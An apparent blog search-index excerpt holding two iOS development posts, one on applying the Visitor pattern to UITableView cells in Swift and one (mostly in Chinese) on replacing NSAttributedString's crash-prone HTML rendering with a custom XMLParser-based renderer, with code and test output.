the Visitor interface, which abstracts the types of DataSources that the operators can accept:protocol FeedVisitor { associatedtype T func visit(_ viewObject: PlainTextFeedViewObject) -&gt; T? func visit(_ viewObject: MediaFeedViewObject) -&gt; T? func visit(_ viewObject: MemoriesFeedViewObject) -&gt; T? //...}Each operator implements the FeedVisitor interface:struct FeedCellVisitor: FeedVisitor { typealias T = UITableViewCell.Type func visit(_ viewObject: MediaFeedViewObject) -&gt; T? { return MediaFeedTableViewCell.self } func visit(_ viewObject: MemoriesFeedViewObject) -&gt; T? { return MemoriesFeedTableViewCell.self } func visit(_ viewObject: PlainTextFeedViewObject) -&gt; T? { return PlainTextFeedTableViewCell.self }}Implementing the mapping between ViewObject and UITableViewCell:struct FeedCellHeightVisitor: FeedVisitor { typealias T = CGFloat func visit(_ viewObject: MediaFeedViewObject) -&gt; T? { return 30 } func visit(_ viewObject: MemoriesFeedViewObject) -&gt; T? { return 10 } func visit(_ viewObject: PlainTextFeedViewObject) -&gt; T? { return 10 }}Implementing the mapping between ViewObject and UITableViewCell Height:struct FeedCellConfiguratorVisitor: FeedVisitor { private let cell: UITableViewCell init(cell: UITableViewCell) { self.cell = cell } func visit(_ viewObject: MediaFeedViewObject) -&gt; Any? { guard let cell = cell as? MediaFeedTableViewCell else { return nil } // cell.config(viewObject) return nil } func visit(_ viewObject: MemoriesFeedViewObject) -&gt; Any? { guard let cell = cell as? MediaFeedTableViewCell else { return nil } // cell.config(viewObject) return nil } func visit(_ viewObject: PlainTextFeedViewObject) -&gt; Any? { guard let cell = cell as? MediaFeedTableViewCell else { return nil } // cell.config(viewObject) return nil }}Implementing how to configure the ViewObject to the Cell.When a new DataSource (ViewObject) needs to be supported, you only need to add a new method to the FeedVisitor interface and implement the corresponding logic in each operator.Binding DataSource (ViewObject) with operators:protocol FeedViewObject { @discardableResult func accept&lt;V: FeedVisitor&gt;(visitor: V) -&gt; V.T?}Implementation of the binding interface in ViewObject:struct PlainTextFeedViewObject: FeedViewObject { func accept&lt;V&gt;(visitor: V) -&gt; V.T? where V : FeedVisitor { return visitor.visit(self) }}struct MemoriesFeedViewObject: FeedViewObject { func accept&lt;V&gt;(visitor: V) -&gt; V.T? where V : FeedVisitor { return visitor.visit(self) }}Implementation in UITableView:final class ViewController: UIViewController { @IBOutlet weak var tableView: UITableView! private let cellVisitor = FeedCellVisitor() private var viewObjects: [FeedViewObject] = [] { didSet { viewObjects.forEach { viewObject in let cellName = viewObject.accept(visitor: cellVisitor) tableView.register(cellName, forCellReuseIdentifier: String(describing: cellName)) } } } override func viewDidLoad() { super.viewDidLoad() tableView.delegate = self tableView.dataSource = self viewObjects = [ MemoriesFeedViewObject(), MediaFeedViewObject(), PlainTextFeedViewObject(), MediaFeedViewObject(), PlainTextFeedViewObject(), MediaFeedViewObject(), PlainTextFeedViewObject() ] // Do any additional setup after loading the view. }}extension ViewController: UITableViewDataSource { func numberOfSections(in tableView: UITableView) -&gt; Int { return 1 } func tableView(_ tableView: UITableView, numberOfRowsInSection section: Int) -&gt; Int { return viewObjects.count } func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -&gt; UITableViewCell { let viewObject = viewObjects[indexPath.row] let cellName = viewObject.accept(visitor: cellVisitor) let cell = tableView.dequeueReusableCell(withIdentifier: String(describing: cellName), for: indexPath) let cellConfiguratorVisitor = FeedCellConfiguratorVisitor(cell: cell) viewObject.accept(visitor: cellConfiguratorVisitor) return cell }}extension ViewController: UITableViewDelegate { func tableView(_ tableView: UITableView, heightForRowAt indexPath: IndexPath) -&gt; CGFloat { let viewObject = viewObjects[indexPath.row] let cellHeightVisitor = FeedCellHeightVisitor() let cellHeight = viewObject.accept(visitor: cellHeightVisitor) ?? UITableView.automaticDimension return cellHeight }}Results Testing: Adheres to the Single Responsibility Principle, allowing for testing of each operator’s logic for each data point. Maintenance and Extensibility: When a new DataSource (ViewObject) needs to be supported, simply add a new method to the Visitor protocol and implement it in the respective operator Visitor. If a new operator needs to be extracted, just create a new class to implement it. Readability: By reviewing each operator object, you can easily understand the composition logic of each View on the entire page.Complete ProjectNote…This article was written during a period of low inspiration in July 2022. If there are any inaccuracies or errors in the content, please feel free to point them out!Further Reading Practical applications of Design Patterns — In WKWebView with Builder, Strategy &amp; Chain of Responsibility Pattern Practical applications of Design Patterns Visitor Pattern in Swift (Share Object to XXX Example)If you have any questions or feedback, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 273 Total Views Last Statistics Date: 2025-08-15 | 178 Views on Medium." }, { "title": "自行實現 iOS NSAttributedString HTML Render", "url": "/posts/zrealm-dev/%E8%87%AA%E8%A1%8C%E5%AF%A6%E7%8F%BE-ios-nsattributedstring-html-render-a8c2d26cc734/", "categories": "ZRealm Dev.", "tags": "ios-app-development, nsattributedstring, html-parsing, html, markdown", "date": "2022-06-10 00:11:59 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.自行實現 iOS NSAttributedString HTML RenderiOS NSAttributedString DocumentType.html 的替代方案Photo by Florian Olivo[TL;DR...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.自行實現 iOS NSAttributedString HTML RenderiOS NSAttributedString DocumentType.html 的替代方案Photo by Florian Olivo[TL;DR] 2023/03/12重新使用其他方式開發了 「 ZMarkupParser HTML String 轉換 NSAttributedString 工具 」 ，技術細節及開發故事請前往「 手工打造 HTML 解析器的那些事 」起源從去年 iOS 15 發佈以來，App 始終被一項 Crash 問題長年霸榜，從數據來看，近 90 天 (2022/03/11~2022/06/08) 一共造成 2.4K+ 次閃退、影響 1.4K+ 位使用者。 此大量閃退問題從數據上看，官方應該已在 iOS ≥ 15.2 後續的版本修復(或減少發生機率)，數據已呈現趨勢下降。最大宗受影響版本： iOS 15.0.X ~ iOS 15.X.X另外有發現 iOS 12、iOS 13 也有零星閃退數，所以此問題應該已存在許久，只是 iOS 15 前幾版發生的機率幾乎是 100%。閃退原因：&lt;compiler-generated&gt; line 2147483647 specialized @nonobjc NSAttributedString.init(data:options:documentAttributes:)NSAttributedString 在 init 時發生 Crashed: com.apple.main-thread EXC_BREAKPOINT 0x00000001de9d4e44 閃退問題。 亦有可能是操作的地方不在 Main Thread.重現方式：此問題大量橫空出世時，讓開發團隊想破腦袋；複測 Crash Log 上的點都沒問題，不清楚使用者是在什麼情況下發生的；直到有一次因緣巧合下我剛好切換成「省電模式」然後就觸發問題了! ! WTF ! ! !解答經過一番搜索發現網路上有許多相同案例，也從 App Developer Forums 找到最早的相同 閃退問題提問 ，並獲得來自 官方 的回答： 這是已知的 iOS Foundation Bug：自 iOS 12 就已存在 如要渲染複雜的、無使用上約束的 HTML：請使用 WKWebView 有渲染約束：可自行撰寫 HTML Parser &amp; Render 直接使用 Markdown 做為渲染約束：iOS ≥ 15 NSAttributedString 可 直接使用 Markdown 格式渲染文字 渲染約束 的意思是限定 App 端能支援的渲染格式，例如只支援 粗體 、斜體、 超連結 。補充. 渲染複雜的 HTML — 想製作文饒圖效果可與後端共同協調ㄧ個介面：{ \"content\":[ {\"type\":\"text\",\"value\":\"第1段純文字\"}, {\"type\":\"text\",\"value\":\"第2段純文字\"}, {\"type\":\"text\",\"value\":\"第3段純文字\"}, {\"type\":\"text\",\"value\":\"第4段純文字\"}, {\"type\":\"image\",\"src\":\"https://zhgchg.li/logo.png\",\"title\":\"ZhgChgLi\"}, {\"type\":\"text\",\"value\":\"第5段純文字\"} ]}可與 Markdown 組合加上支援文字渲染，或參考 Medium 做法：\"Paragraph\": { \"text\": \"code in text, and link in text, and ZhgChgLi, and bold, and I, only i\", \"markups\": [ { \"type\": \"CODE\", \"start\": 5, \"end\": 7 }, { \"start\": 18, \"end\": 22, \"href\": \"http://zhgchg.li\", \"type\": \"LINK\" }, { \"type\": \"STRONG\", \"start\": 50, \"end\": 63 }, { \"type\": \"EM\", \"start\": 55, \"end\": 69 } ]}意思是 code in text, and link in text, and ZhgChgLi, and bold, and I, only i 這段文字的:- 第 5 到第 7 字元要標示為 程式碼 (用`Text`格式包裝)- 第 18 到第 22 字元要標示為 連結 (用[Text](URL)格式包裝)- 第 50 到第 63 字元要標示為 粗體(用*Text*格式包裝)- 第 55 到第 69 字元要標示為 斜體(用_Text_格式包裝)有規範＆可描述的結構後，App 就能自行使用原生方式渲染，達到效能、使用體驗最佳化。 UITextView 做文饒圖的坑，可參考我之前的文章： iOS UITextView 文繞圖編輯器 (Swift)Why?在實踐解答之前我們先回歸探究問題本身，個人認為這個問題主因並非來自 Apple，官方的 Bug 只是這個問題的引爆點。問題主要來自 App 端被當成 Web 來進行渲染 ，優點是 Web 開發快速，同個 API Endpoint 可以不用區分 Client 都給 HTML、可以彈性渲染任何想呈現的內容；缺點是 HTML 並非 App 的常見接口、不能期望 App Engineer 懂 HTML、 效能極差 、只能在 Main Thread、開發階段無法預期結果、無法確認支援規格。再往上找問題，多半是原始需求無法確定、不能確定 App 需要支援哪些規格、為了求快，才導致直接使用 HTML 做為 App 與 Web 的接口。效能極差補充效能部分，實測直接使用 NSAttributedString DocumentType.html 與自行實現渲染的方式有 5~20 倍的速度差距。Better既然是 App 要用，更好的做法要以 App 開發方式為出發點，對 App 來說需求的調整成本比 Web 高很多；有效的 App 開發應該要基於有規格的迭代調整，當下需要確定能支援的規格，之後如果要改我們就安排時間擴充規格，無法快速的想改就改，可以減少溝通成本、增加工作效率。 確認需求範圍 確認支援的規格 確認接口規範 (Markdown/BBCode/…要繼續用 HTML 也行，但要是有約束的，例如只用 &lt;b&gt;/&lt;i&gt;/&lt;a&gt;/&lt;u&gt; ，要在程式 明確告知 開發者) 自行實現渲染機制 維護、迭代支援規格[2023/02/27 Updated] [TL;DR]:已更新做法，不使用 XMLParser，因容錯率為 0 :&lt;br&gt; / &lt;Congratulation!&gt; / &lt;b&gt;Bold&lt;i&gt;Bold+Italic&lt;/b&gt;Italic&lt;/i&gt; 以上三種有可能出現的情境 XMLParser 解析都會出錯直接 Throw Error 顯示空白。使用 XMLParser，HTML 字串必須完全符合 XML 規則，無法像瀏覽器或 NSAttributedString.DocumentType.html 容錯正常顯示。改使用純 Swift 開發，透過 Regex 剖析出 HTML Tag 並經過 Tokenization，分析修正 Tag 正確性(修正沒有 end 的 tag &amp; 錯位 tag)，再轉換成 abstract syntax tree，最終使用 Visitor Pattern 將 HTML Tag 與抽象樣式對應，得到最終 NSAttributedString 結果；其中不依賴任何 Parser Lib。— —How?木已成舟，回歸正題，目前已用 HTML 在渲染 NSAttributedString 那我們該如何解決上述的閃退還有效能問題呢？Inspired byStrip HTML 去除 HTML在談 HTML Render 之前先談 Strip HTML，還是再提一次前文 Why? 章節所說的，App 哪裡會拿到 HTML、會拿到哪些 HTML 應該要在規格協定好；而不是 App 這邊「 可能 」會拿到 HTML，需要 Strip 掉。 套句之前主管的名言：這樣太瘋了吧？Option 1. NSAttributedStringlet data = \"&lt;div&gt;Text&lt;/div&gt;\".data(using: .unicode)!let attributed = try NSAttributedString(data: data, options: [.documentType: NSAttributedString.DocumentType.html, .characterEncoding: String.Encoding.utf8.rawValue], documentAttributes: nil)let string = attributed.string 使用 NSAttributedString Render HTML 然後再取 string 出來就會是乾淨的 String 了 問題同本章問題，iOS 15 容易閃退、效能不好、只能在 Main Thread 操作Option 2. RegexhtmlString = \"&lt;div&gt;Test&lt;/div&gt;\"htmlString.replacingOccurrences(of: \"&lt;[^&gt;]+&gt;\", with: \"\", options: .regularExpression, range: nil) 最簡單有效的方式 Regex 並不能保證完全正確 e.g &lt;p foo=\"&gt;now what?\"&gt;Paragraph&lt;/p&gt; 是合法的 HTML 但會 Strip 錯誤Option 3. XMLParser參考 SwiftRichString 的做法，使用 Foundation 中的 XMLParser 將 HTML 做為 XML 解析自行實現 HTML Parser &amp; Strip 功能。import UIKit// Ref: https://github.com/malcommac/SwiftRichStringfinal class HTMLStripper: NSObject, XMLParserDelegate { private static let topTag = \"source\" private var xmlParser: XMLParser private(set) var storedString: String // The XML parser sometimes splits strings, which can break localization-sensitive // string transforms. Work around this by using the currentString variable to // accumulate partial strings, and then reading them back out as a single string // when the current element ends, or when a new one is started. private var currentString: String? // MARK: - Initialization init(string: String) throws { let xmlString = HTMLStripper.escapeWithUnicodeEntities(string) let xml = \"&lt;\\(HTMLStripper.topTag)&gt;\\(xmlString)&lt;/\\(HTMLStripper.topTag)&gt;\" guard let data = xml.data(using: String.Encoding.utf8) else { throw XMLParserInitError(\"Unable to convert to UTF8\") } self.xmlParser = XMLParser(data: data) self.storedString = \"\" super.init() xmlParser.shouldProcessNamespaces = false xmlParser.shouldReportNamespacePrefixes = false xmlParser.shouldResolveExternalEntities = false xmlParser.delegate = self } /// Parse and generate attributed string. func parse() throws -&gt; String { guard xmlParser.parse() else { let line = xmlParser.lineNumber let shiftColumn = (line == 1) let shiftSize = HTMLStripper.topTag.lengthOfBytes(using: String.Encoding.utf8) + 2 let column = xmlParser.columnNumber - (shiftColumn ? shiftSize : 0) throw XMLParserError(parserError: xmlParser.parserError, line: line, column: column) } return storedString } // MARK: XMLParserDelegate @objc func parser(_ parser: XMLParser, didStartElement elementName: String, namespaceURI: String?, qualifiedName qName: String?, attributes attributeDict: [String: String]) { foundNewString() } @objc func parser(_ parser: XMLParser, didEndElement elementName: String, namespaceURI: String?, qualifiedName qName: String?) { foundNewString() } @objc func parser(_ parser: XMLParser, foundCharacters string: String) { currentString = (currentString ?? \"\").appending(string) } // MARK: Support Private Methods func foundNewString() { if let currentString = currentString { storedString.append(currentString) self.currentString = nil } } // handle html entity / html hex // Perform string escaping to replace all characters which is not supported by NSXMLParser // into the specified encoding with decimal entity. // For example if your string contains '&amp;' character parser will break the style. // This option is active by default. // ref: https://github.com/malcommac/SwiftRichString/blob/e0b72d5c96968d7802856d2be096202c9798e8d1/Sources/SwiftRichString/Support/XMLStringBuilder.swift static func escapeWithUnicodeEntities(_ string: String) -&gt; String { guard let escapeAmpRegExp = try? NSRegularExpression(pattern: \"&amp;(?!(#[0-9]{2,4}|[A-z]{2,6});)\", options: NSRegularExpression.Options(rawValue: 0)) else { return string } let range = NSRange(location: 0, length: string.count) return escapeAmpRegExp.stringByReplacingMatches(in: string, options: NSRegularExpression.MatchingOptions(rawValue: 0), range: range, withTemplate: \"&amp;amp;\") }}let test = \"我&lt;br/&gt;&lt;a href=\\\"http://google.com\\\"&gt;同意&lt;/a&gt;提供&lt;b&gt;&lt;i&gt;個&lt;/i&gt;人&lt;/b&gt;身分證字號／護照／居留&lt;span style=\\\"color:#FF0000;font-size:20px;word-spacing:10px;line-height:10px\\\"&gt;證號碼&lt;/span&gt;，以供&lt;i&gt;跨境物流&lt;/i&gt;方通關&lt;span style=\\\"background-color:#00FF00;\\\"&gt;使用&lt;/span&gt;，並已&lt;img src=\\\"g.png\\\"/&gt;了解跨境&lt;br/&gt;商品之物&lt;p&gt;流需&lt;/p&gt;求\"let stripper = try HTMLStripper(string: test)print(try! stripper.parse())// 我同意提供個人身分證 字號／護照／居留證號碼，以供跨境物流方通關使用，並已了解跨境商品之物流需求使用 Foundation XML Parser 去處理 String，實現 XMLParserDelegate 用 currentString 存放 String，因 String 有時會拆成多個 String 所以 foundCharacters 是有機會被重複呼叫的， didStartElement 、 didEndElement 找到字串開始時、結束時，將當前結果存下並清空 currentString 。 優點是會連帶轉換 HTML Entity to 實際字元 e.g. &amp;#103; -&gt; g 優點是實現複雜、遇到不合規格的 HTML 會 XMLParser 失敗 e.g. &lt;br&gt; 忘了寫成 &lt;br/&gt; 個人認為單純要 Strip HTML Option 2. 是比較好的方法 ，會介紹此方法是因為 Render HTML 也是使用相同原理，先用這個做為簡單範例 :)HTML Render w/XMLParser使用 XMLParser 自行實現，同 Strip 原理，我們可以多加上剖析到什麼 Tag 時要做對應的渲染方式。需求規格： 支援擴充想剖析的 Tag 支援設定 Tag Default Style e.g &lt;a&gt; Tag 套用連結樣式 支援剖析 style Attributed，因 HTML 會在 style=\"color:red\" 上去明示要顯示的樣式 樣式支援更改文字粗細、大小、底線、行距、字距、背景顏色、字顏色 不支援 Image Tag、Table Tag…等較複雜 TAG 大家可依照自己的規格需求去刪減功能，例如不需支援背景顏色調整，則不需要開出可設定背景顏色的口。 本文只是概念實現， 並非架構上的 Best Practice ；如有明確規格、使用方式，可考慮套用些 Design Pattern 來實現，達成好維護好擴充。⚠️⚠️⚠️ Attention ⚠️⚠️⚠️再次提醒， 如果你的 App 是全新的或有機會直接全改成 Markdown 格式，建議還是採用以上方式，本篇自行撰寫 Render 太複雜且效能不會比 Markdown 好 。 即使你是 iOS &lt; 15 不支援原生 Markdown，還是可以在 Github 上找到 大神做好的 Markdown Parser 方案 。HTMLTagParserprotocol HTMLTagParser { static var tag: String { get } // 宣告想解析的 Tag Name, e.g. a var storedHTMLAttributes: [String: String]? { get set } // Attributed 解析結果將存放於此, e.g. href,style var style: AttributedStringStyle? { get } // 此 Tag 想套用的樣式 func render(attributedString: inout NSMutableAttributedString) // 實現渲染 HTML to attributedString 的邏輯}宣告可剖析的 HTML Tag 實體，方便擴充管理。AttributedStringStyleprotocol AttributedStringStyle { var font: UIFont? { get set } var color: UIColor? { get set } var backgroundColor: UIColor? { get set } var wordSpacing: CGFloat? { get set } var paragraphStyle: NSParagraphStyle? { get set } var customs: [NSAttributedString.Key: Any]? { get set } // 萬能設定口，建議確定可支援規格後將其抽象出來，並關閉此開口 func render(attributedString: inout NSMutableAttributedString)}// abstract implementextension AttributedStringStyle { func render(attributedString: inout NSMutableAttributedString) { let range = NSMakeRange(0, attributedString.length) if let font = font { attributedString.addAttribute(NSAttributedString.Key.font, value: font, range: range) } if let color = color { attributedString.addAttribute(NSAttributedString.Key.foregroundColor, value: color, range: range) } if let backgroundColor = backgroundColor { attributedString.addAttribute(NSAttributedString.Key.backgroundColor, value: backgroundColor, range: range) } if let wordSpacing = wordSpacing { attributedString.addAttribute(NSAttributedString.Key.kern, value: wordSpacing as Any, range: range) } if let paragraphStyle = paragraphStyle { attributedString.addAttribute(NSAttributedString.Key.paragraphStyle, value: paragraphStyle, range: range) } if let customAttributes = customs { attributedString.addAttributes(customAttributes, range: range) } }}宣告 Tag 可供設定的樣式。HTMLStyleAttributedParser// only support tag attributed down below// can set color,font seize,line height,word spacing,background colorenum HTMLStyleAttributedParser: String { case color = \"color\" case fontSize = \"font-size\" case lineHeight = \"line-height\" case wordSpacing = \"word-spacing\" case backgroundColor = \"background-color\" func render(attributedString: inout NSMutableAttributedString, value: String) -&gt; Bool { let range = NSMakeRange(0, attributedString.length) switch self { case .color: if let color = convertToiOSColor(value) { attributedString.addAttribute(NSAttributedString.Key.foregroundColor, value: color, range: range) return true } case .backgroundColor: if let color = convertToiOSColor(value) { attributedString.addAttribute(NSAttributedString.Key.backgroundColor, value: color, range: range) return true } case .fontSize: if let size = convertToiOSSize(value) { attributedString.addAttribute(NSAttributedString.Key.font, value: UIFont.systemFont(ofSize: CGFloat(size)), range: range) return true } case .lineHeight: if let size = convertToiOSSize(value) { let paragraphStyle = NSMutableParagraphStyle() paragraphStyle.lineSpacing = size attributedString.addAttribute(NSAttributedString.Key.paragraphStyle, value: paragraphStyle, range: range) return true } case .wordSpacing: if let size = convertToiOSSize(value) { attributedString.addAttribute(NSAttributedString.Key.kern, value: size, range: range) return true } } return false } // convert 36px -&gt; 36 private func convertToiOSSize(_ string: String) -&gt; CGFloat? { guard let regex = try? NSRegularExpression(pattern: \"^([0-9]+)\"), let firstMatch = regex.firstMatch(in: string, options: [], range: NSRange(location: 0, length: string.utf16.count)), let range = Range(firstMatch.range, in: string), let size = Float(String(string[range])) else { return nil } return CGFloat(size) } // convert html hex color #ffffff to UIKit Color private func convertToiOSColor(_ hexString: String) -&gt; UIColor? { var cString: String = hexString.trimmingCharacters(in: .whitespacesAndNewlines).uppercased() if cString.hasPrefix(\"#\") { cString.remove(at: cString.startIndex) } if (cString.count) != 6 { return nil } var rgbValue: UInt64 = 0 Scanner(string: cString).scanHexInt64(&amp;rgbValue) return UIColor( red: CGFloat((rgbValue &amp; 0xFF0000) &gt;&gt; 16) / 255.0, green: CGFloat((rgbValue &amp; 0x00FF00) &gt;&gt; 8) / 255.0, blue: CGFloat(rgbValue &amp; 0x0000FF) / 255.0, alpha: CGFloat(1.0) ) }}實現 Style Attributed Parser 解析 style=\"color:red;font-size:16px\" 但 CSS Style 有非常多可設定樣式，所以需要列舉可支援範圍。extension HTMLTagParser { func render(attributedString: inout NSMutableAttributedString) { defaultStyleRender(attributedString: &amp;attributedString) } func defaultStyleRender(attributedString: inout NSMutableAttributedString) { // setup default style to NSMutableAttributedString style?.render(attributedString: &amp;attributedString) // setup &amp; override HTML style (style=\"color:red;background-color:black\") to NSMutableAttributedString if is exists // any html tag can have style attribute if let style = storedHTMLAttributes?[\"style\"] { let styles = style.split(separator: \";\").map { $0.split(separator: \":\") }.filter { $0.count == 2 } for style in styles { let key = String(style[0]) let value = String(style[1]) if let styleAttributed = HTMLStyleAttributedParser(rawValue: key), styleAttributed.render(attributedString: &amp;attributedString, value: value) { print(\"Unsupport style attributed or value[\\(key):\\(value)]\") } } } }}套用 HTMLStyleAttributedParser &amp; HTMLStyleAttributedParser 抽象實現。一些 Tag Parser &amp; AttributedStringStyle 的實現範例struct LinkStyle: AttributedStringStyle { var font: UIFont? = UIFont.systemFont(ofSize: 14) var color: UIColor? = UIColor.blue var backgroundColor: UIColor? = nil var wordSpacing: CGFloat? = nil var paragraphStyle: NSParagraphStyle? var customs: [NSAttributedString.Key: Any]? = [.underlineStyle: NSUnderlineStyle.single.rawValue]}struct ATagParser: HTMLTagParser { // &lt;a&gt;&lt;/a&gt; static let tag: String = \"a\" var storedHTMLAttributes: [String: String]? = nil let style: AttributedStringStyle? = LinkStyle() func render(attributedString: inout NSMutableAttributedString) { defaultStyleRender(attributedString: &amp;attributedString) if let href = storedHTMLAttributes?[\"href\"], let url = URL(string: href) { let range = NSMakeRange(0, attributedString.length) attributedString.addAttribute(NSAttributedString.Key.link, value: url, range: range) } }}struct BoldStyle: AttributedStringStyle { var font: UIFont? = UIFont.systemFont(ofSize: 14, weight: .bold) var color: UIColor? = UIColor.black var backgroundColor: UIColor? = nil var wordSpacing: CGFloat? = nil var paragraphStyle: NSParagraphStyle? var customs: [NSAttributedString.Key: Any]? = [.underlineStyle: NSUnderlineStyle.single.rawValue]}struct BoldTagParser: HTMLTagParser { // &lt;b&gt;&lt;/b&gt; static let tag: String = \"b\" var storedHTMLAttributes: [String: String]? = nil let style: AttributedStringStyle? = BoldStyle()}HTMLToAttributedStringParser: XMLParserDelegate 核心實現// Ref: https://github.com/malcommac/SwiftRichStringfinal class HTMLToAttributedStringParser: NSObject { private static let topTag = \"source\" private var xmlParser: XMLParser? private(set) var attributedString: NSMutableAttributedString = NSMutableAttributedString() private(set) var supportedTagRenders: [HTMLTagParser] = [] private let defaultStyle: AttributedStringStyle /// Styles applied at each fragment. private var renderingTagRenders: [HTMLTagParser] = [] // The XML parser sometimes splits strings, which can break localization-sensitive // string transforms. Work around this by using the currentString variable to // accumulate partial strings, and then reading them back out as a single string // when the current element ends, or when a new one is started. private var currentString: String? // MARK: - Initialization init(defaultStyle: AttributedStringStyle) { self.defaultStyle = defaultStyle super.init() } func register(_ tagRender: HTMLTagParser) { if let index = supportedTagRenders.firstIndex(where: { type(of: $0).tag == type(of: tagRender).tag }) { supportedTagRenders.remove(at: index) } supportedTagRenders.append(tagRender) } /// Parse and generate attributed string. func parse(string: String) throws -&gt; NSAttributedString { var xmlString = HTMLToAttributedStringParser.escapeWithUnicodeEntities(string) // make sure &lt;br/&gt; format is correct XML // because Web may use &lt;br&gt; to present &lt;br/&gt;, but &lt;br&gt; is not a vaild XML xmlString = xmlString.replacingOccurrences(of: \"&lt;br&gt;\", with: \"&lt;br/&gt;\") let xml = \"&lt;\\(HTMLToAttributedStringParser.topTag)&gt;\\(xmlString)&lt;/\\(HTMLToAttributedStringParser.topTag)&gt;\" guard let data = xml.data(using: String.Encoding.utf8) else { throw XMLParserInitError(\"Unable to convert to UTF8\") } let xmlParser = XMLParser(data: data) xmlParser.shouldProcessNamespaces = false xmlParser.shouldReportNamespacePrefixes = false xmlParser.shouldResolveExternalEntities = false xmlParser.delegate = self self.xmlParser = xmlParser attributedString = NSMutableAttributedString() guard xmlParser.parse() else { let line = xmlParser.lineNumber let shiftColumn = (line == 1) let shiftSize = HTMLToAttributedStringParser.topTag.lengthOfBytes(using: String.Encoding.utf8) + 2 let column = xmlParser.columnNumber - (shiftColumn ? shiftSize : 0) throw XMLParserError(parserError: xmlParser.parserError, line: line, column: column) } return attributedString }}// MARK: Private Methodprivate extension HTMLToAttributedStringParser { func enter(element elementName: String, attributes: [String: String]) { // elementName = tagName, EX: a,span,div... guard elementName != HTMLToAttributedStringParser.topTag else { return } if let index = supportedTagRenders.firstIndex(where: { type(of: $0).tag == elementName }) { var tagRender = supportedTagRenders[index] tagRender.storedHTMLAttributes = attributes renderingTagRenders.append(tagRender) } } func exit(element elementName: String) { if !renderingTagRenders.isEmpty { renderingTagRenders.removeLast() } } func foundNewString() { if let currentString = currentString { // currentString != nil ,ex: &lt;i&gt;currentString&lt;/i&gt; var newAttributedString = NSMutableAttributedString(string: currentString) if !renderingTagRenders.isEmpty { for (key, tagRender) in renderingTagRenders.enumerated() { // Render Style tagRender.render(attributedString: &amp;newAttributedString) renderingTagRenders[key].storedHTMLAttributes = nil } } else { defaultStyle.render(attributedString: &amp;newAttributedString) } attributedString.append(newAttributedString) self.currentString = nil } else { // currentString == nil ,ex: &lt;br/&gt; var newAttributedString = NSMutableAttributedString() for (key, tagRender) in renderingTagRenders.enumerated() { // Render Style tagRender.render(attributedString: &amp;newAttributedString) renderingTagRenders[key].storedHTMLAttributes = nil } attributedString.append(newAttributedString) } }}// MARK: Helperextension HTMLToAttributedStringParser { // handle html entity / html hex // Perform string escaping to replace all characters which is not supported by NSXMLParser // into the specified encoding with decimal entity. // For example if your string contains '&amp;' character parser will break the style. // This option is active by default. // ref: https://github.com/malcommac/SwiftRichString/blob/e0b72d5c96968d7802856d2be096202c9798e8d1/Sources/SwiftRichString/Support/XMLStringBuilder.swift static func escapeWithUnicodeEntities(_ string: String) -&gt; String { guard let escapeAmpRegExp = try? NSRegularExpression(pattern: \"&amp;(?!(#[0-9]{2,4}|[A-z]{2,6});)\", options: NSRegularExpression.Options(rawValue: 0)) else { return string } let range = NSRange(location: 0, length: string.count) return escapeAmpRegExp.stringByReplacingMatches(in: string, options: NSRegularExpression.MatchingOptions(rawValue: 0), range: range, withTemplate: \"&amp;amp;\") }}// MARK: XMLParserDelegateextension HTMLToAttributedStringParser: XMLParserDelegate { func parser(_ parser: XMLParser, didStartElement elementName: String, namespaceURI: String?, qualifiedName qName: String?, attributes attributeDict: [String: String]) { foundNewString() enter(element: elementName, attributes: attributeDict) } func parser(_ parser: XMLParser, didEndElement elementName: String, namespaceURI: String?, qualifiedName qName: String?) { foundNewString() guard elementName != HTMLToAttributedStringParser.topTag else { return } exit(element: elementName) } func parser(_ parser: XMLParser, foundCharacters string: String) { currentString = (currentString ?? \"\").appending(string) }}套用 Strip 的邏輯，我們可以幫拆好的架構在其中進行組合從 elementName 知道當前的 Tag 並套用相應的 Tag Parser 及套上定義好的 Style。Test Resultlet test = \"我&lt;br/&gt;&lt;a href=\\\"http://google.com\\\"&gt;同意&lt;/a&gt;提供&lt;b&gt;&lt;i&gt;個&lt;/i&gt;人&lt;/b&gt;身分證字號／護照／居留&lt;span style=\\\"color:#FF0000;font-size:20px;word-spacing:10px;line-height:10px\\\"&gt;證號碼&lt;/span&gt;，以供&lt;i&gt;跨境物流&lt;/i&gt;方通關&lt;span style=\\\"background-color:#00FF00;\\\"&gt;使用&lt;/span&gt;，並已&lt;img src=\\\"g.png\\\"/&gt;了解跨境&lt;br/&gt;商品之物&lt;p&gt;流需&lt;/p&gt;求\"let render = HTMLToAttributedStringParser(defaultStyle: DefaultTextStyle())render.register(ATagParser())render.register(BoldTagParser())render.register(SpanTagParser())//...print(try! render.parse(string: test))// Result:// 我{// NSColor = \"UIExtendedGrayColorSpace 0 1\";// NSFont = \"\\\".SFNS-Regular 14.00 pt. P [] (0x13a012970) fobj=0x13a012970, spc=3.79\\\"\";// NSParagraphStyle = \"Alignment 4, LineSpacing 3, ParagraphSpacing 0, ParagraphSpacingBefore 0, HeadIndent 0, TailIndent 0, FirstLineHeadIndent 0, LineHeight 0/0, LineHeightMultiple 0, LineBreakMode 0, Tabs (\\n 28L,\\n 56L,\\n 84L,\\n 112L,\\n 140L,\\n 168L,\\n 196L,\\n 224L,\\n 252L,\\n 280L,\\n 308L,\\n 336L\\n), DefaultTabInterval 0, Blocks (\\n), Lists (\\n), BaseWritingDirection -1, HyphenationFactor 0, TighteningForTruncation NO, HeaderLevel 0 LineBreakStrategy 0 PresentationIntents (\\n) ListIntentOrdinal 0 CodeBlockIntentLanguageHint ''\";// }同意{// NSColor = \"UIExtendedSRGBColorSpace 0 0 1 1\";// NSFont = \"\\\".SFNS-Regular 14.00 pt. P [] (0x13a012970) fobj=0x13a012970, spc=3.79\\\"\";// NSLink = \"http://google.com\";// NSUnderline = 1;// }提供{// NSColor = \"UIExtendedGrayColorSpace 0 1\";// NSFont = \"\\\".SFNS-Regular 14.00 pt. P [] (0x13a012970) fobj=0x13a012970, spc=3.79\\\"\";// NSParagraphStyle = \"Alignment 4, LineSpacing 3, ParagraphSpacing 0, ParagraphSpacingBefore 0, HeadIndent 0, TailIndent 0, FirstLineHeadIndent 0, LineHeight 0/0, LineHeightMultiple 0, LineBreakMode 0, 